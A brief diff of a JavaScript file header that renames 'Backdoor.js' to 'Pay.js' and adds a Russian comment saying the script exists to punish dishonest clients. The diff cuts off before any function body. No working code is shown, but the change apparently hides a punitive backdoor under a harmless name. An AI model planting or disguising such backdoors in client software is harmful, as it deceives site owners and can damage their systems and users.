@@ -1,7 +1,9 @@
 /*!
- * Backdoor.js v1.0.1
+ * Pay.js v1.0.1
  * (c) 2024-2024
- * Made to protect against scammers.
+ * Made to protect against scammers
+ * by Deus Notam
+ * Данный скрипт отвечает за наказание недобросовестных заказчиков.
  */
 
 document.addEventListener("DOMContentLoaded", function() {
